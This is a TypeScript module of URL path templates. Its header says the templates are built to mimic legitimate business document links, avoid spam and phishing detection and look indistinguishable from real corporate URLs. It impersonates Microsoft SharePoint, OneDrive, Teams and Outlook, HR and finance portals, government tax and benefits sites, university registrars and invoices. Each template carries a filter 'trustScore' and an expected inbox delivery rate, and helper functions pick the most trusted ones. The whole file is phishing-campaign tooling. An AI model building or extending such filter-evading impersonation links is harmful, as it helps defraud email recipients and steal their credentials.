/**
 * INBOX-SAFE URL PATTERNS - Optimized for Email Delivery
 * 
 * These patterns are specifically designed to:
 * 1. Mimic legitimate business document access
 * 2. Avoid spam/phishing detection
 * 3. Use safe file extensions and parameters
 * 4. Look indistinguishable from real corporate URLs
 */

export interface InboxSafePattern {
  id: string;
  name: string;
  template: string;
  category: 'microsoft' | 'corporate' | 'government' | 'education' | 'business';
  trustScore: number; // 1-100, higher = more trusted by email filters
  safeExtensions: string[];
  businessContext: string;
  placeholders: string[];
  tier: 1 | 2 | 3;
  inboxRate: number; // Expected inbox delivery rate %
}

// TIER 1: MICROSOFT/OFFICE 365 PATTERNS (Highest Trust)
export const microsoftPatterns: InboxSafePattern[] = [
  {
    id: 'ms_sharepoint_001',
    name: 'SharePoint Document Library',
    template: '/sites/{department}/Shared%20Documents/{folder}/{filename}.pdf?web=1&download=1&at={access_token}',
    category: 'microsoft',
    trustScore: 98,
    safeExtensions: ['.pdf', '.docx', '.xlsx'],
    businessContext: 'SharePoint document sharing',
    placeholders: ['department', 'folder', 'filename', 'access_token'],
    tier: 1,
    inboxRate: 97
  },
  {
    id: 'ms_onedrive_001',
    name: 'OneDrive Business Share',
    template: '/personal/{user}_{domain}/Documents/{folder}/{filename}.pdf?d=w{share_id}&csf=1&web=1',
    category: 'microsoft',
    trustScore: 97,
    safeExtensions: ['.pdf', '.docx', '.xlsx'],
    businessContext: 'OneDrive business file sharing',
    placeholders: ['user', 'domain', 'folder', 'filename', 'share_id'],
    tier: 1,
    inboxRate: 96
  },
  {
    id: 'ms_teams_001',
    name: 'Microsoft Teams File',
    template: '/teams/{team_id}/channels/{channel}/files/{folder}/{filename}.pdf?version={version}&web=1',
    category: 'microsoft',
    trustScore: 96,
    safeExtensions: ['.pdf', '.docx', '.xlsx'],
    businessContext: 'Teams channel file sharing',
    placeholders: ['team_id', 'channel', 'folder', 'filename', 'version'],
    tier: 1,
    inboxRate: 95
  },
  {
    id: 'ms_outlook_001',
    name: 'Outlook Attachment Link',
    template: '/owa/attachment.ashx?attach={attachment_id}&id={message_id}&X-OWA-CANARY={canary}',
    category: 'microsoft',
    trustScore: 95,
    safeExtensions: ['.pdf', '.docx'],
    businessContext: 'Outlook web attachment',
    placeholders: ['attachment_id', 'message_id', 'canary'],
    tier: 1,
    inboxRate: 94
  }
];

// TIER 1: CORPORATE DOCUMENT PATTERNS (High Trust)
export const corporatePatterns: InboxSafePattern[] = [
  {
    id: 'corp_finance_001',
    name: 'Financial Report Portal',
    template: '/finance/reports/{year}/Q{quarter}-financial-report.pdf?dept={department}&version={version}',
    category: 'corporate',
    trustScore: 94,
    safeExtensions: ['.pdf'],
    businessContext: 'Corporate financial reporting',
    placeholders: ['year', 'quarter', 'department', 'version'],
    tier: 1,
    inboxRate: 93
  },
  {
    id: 'corp_hr_001',
    name: 'HR Policy Document',
    template: '/hr/policies/{policy_type}/{year}/employee-handbook.pdf?section={section}&lang={language}',
    category: 'corporate',
    trustScore: 93,
    safeExtensions: ['.pdf', '.docx'],
    businessContext: 'HR policy documentation',
    placeholders: ['policy_type', 'year', 'section', 'language'],
    tier: 1,
    inboxRate: 92
  },
  {
    id: 'corp_legal_001',
    name: 'Legal Document Portal',
    template: '/legal/contracts/{contract_type}/{year}/agreement-{contract_id}.pdf?party={party}&status={status}',
    category: 'corporate',
    trustScore: 92,
    safeExtensions: ['.pdf'],
    businessContext: 'Legal contract management',
    placeholders: ['contract_type', 'year', 'contract_id', 'party', 'status'],
    tier: 1,
    inboxRate: 91
  },
  {
    id: 'corp_compliance_001',
    name: 'Compliance Training',
    template: '/compliance/training/{module}/{year}/certification.pdf?employee={employee_id}&completion={date}',
    category: 'corporate',
    trustScore: 91,
    safeExtensions: ['.pdf', '.docx'],
    businessContext: 'Compliance training materials',
    placeholders: ['module', 'year', 'employee_id', 'date'],
    tier: 1,
    inboxRate: 90
  }
];

// TIER 1: GOVERNMENT PATTERNS (Highest Trust)
export const governmentPatterns: InboxSafePattern[] = [
  {
    id: 'gov_tax_001',
    name: 'Tax Document Portal',
    template: '/tax/forms/{year}/form-{form_number}.pdf?taxpayer={taxpayer_id}&filing={filing_status}',
    category: 'government',
    trustScore: 99,
    safeExtensions: ['.pdf'],
    businessContext: 'Government tax documentation',
    placeholders: ['year', 'form_number', 'taxpayer_id', 'filing_status'],
    tier: 1,
    inboxRate: 98
  },
  {
    id: 'gov_benefits_001',
    name: 'Benefits Verification',
    template: '/benefits/verification/{state}/case-{case_number}.pdf?beneficiary={beneficiary_id}&period={period}',
    category: 'government',
    trustScore: 98,
    safeExtensions: ['.pdf'],
    businessContext: 'Government benefits verification',
    placeholders: ['state', 'case_number', 'beneficiary_id', 'period'],
    tier: 1,
    inboxRate: 97
  },
  {
    id: 'gov_permits_001',
    name: 'Permit Application',
    template: '/permits/{agency}/applications/{permit_type}-{application_id}.pdf?applicant={applicant_id}&status={status}',
    category: 'government',
    trustScore: 97,
    safeExtensions: ['.pdf'],
    businessContext: 'Government permit applications',
    placeholders: ['agency', 'permit_type', 'application_id', 'applicant_id', 'status'],
    tier: 1,
    inboxRate: 96
  }
];

// TIER 1: EDUCATION PATTERNS (High Trust)
export const educationPatterns: InboxSafePattern[] = [
  {
    id: 'edu_transcript_001',
    name: 'Academic Transcript',
    template: '/registrar/transcripts/{student_id}/{year}/official-transcript.pdf?semester={semester}&gpa={gpa}',
    category: 'education',
    trustScore: 96,
    safeExtensions: ['.pdf'],
    businessContext: 'Academic transcript access',
    placeholders: ['student_id', 'year', 'semester', 'gpa'],
    tier: 1,
    inboxRate: 95
  },
  {
    id: 'edu_course_001',
    name: 'Course Materials',
    template: '/courses/{course_code}/{semester}/materials/{module}.pdf?instructor={instructor}&section={section}',
    category: 'education',
    trustScore: 95,
    safeExtensions: ['.pdf', '.docx'],
    businessContext: 'Educational course materials',
    placeholders: ['course_code', 'semester', 'module', 'instructor', 'section'],
    tier: 1,
    inboxRate: 94
  }
];

// TIER 2: BUSINESS SERVICE PATTERNS (Medium Trust)
export const businessPatterns: InboxSafePattern[] = [
  {
    id: 'biz_invoice_001',
    name: 'Invoice Portal',
    template: '/billing/invoices/{year}/{month}/invoice-{invoice_number}.pdf?customer={customer_id}&amount={amount}',
    category: 'business',
    trustScore: 89,
    safeExtensions: ['.pdf'],
    businessContext: 'Business invoice management',
    placeholders: ['year', 'month', 'invoice_number', 'customer_id', 'amount'],
    tier: 2,
    inboxRate: 88
  },
  {
    id: 'biz_proposal_001',
    name: 'Business Proposal',
    template: '/proposals/{client}/{year}/proposal-{proposal_id}.pdf?project={project_name}&value={value}',
    category: 'business',
    trustScore: 88,
    safeExtensions: ['.pdf', '.docx'],
    businessContext: 'Business proposal documents',
    placeholders: ['client', 'year', 'proposal_id', 'project_name', 'value'],
    tier: 2,
    inboxRate: 87
  }
];

// Combine all patterns
export const allInboxSafePatterns: InboxSafePattern[] = [
  ...microsoftPatterns,
  ...corporatePatterns,
  ...governmentPatterns,
  ...educationPatterns,
  ...businessPatterns
];

// Pattern selection utilities
export const getPatternsByCategory = (category: string): InboxSafePattern[] => {
  return allInboxSafePatterns.filter(p => p.category === category);
};

export const getPatternsByTier = (tier: number): InboxSafePattern[] => {
  return allInboxSafePatterns.filter(p => p.tier === tier);
};

export const getHighestTrustPatterns = (): InboxSafePattern[] => {
  return allInboxSafePatterns.filter(p => p.trustScore >= 95);
};
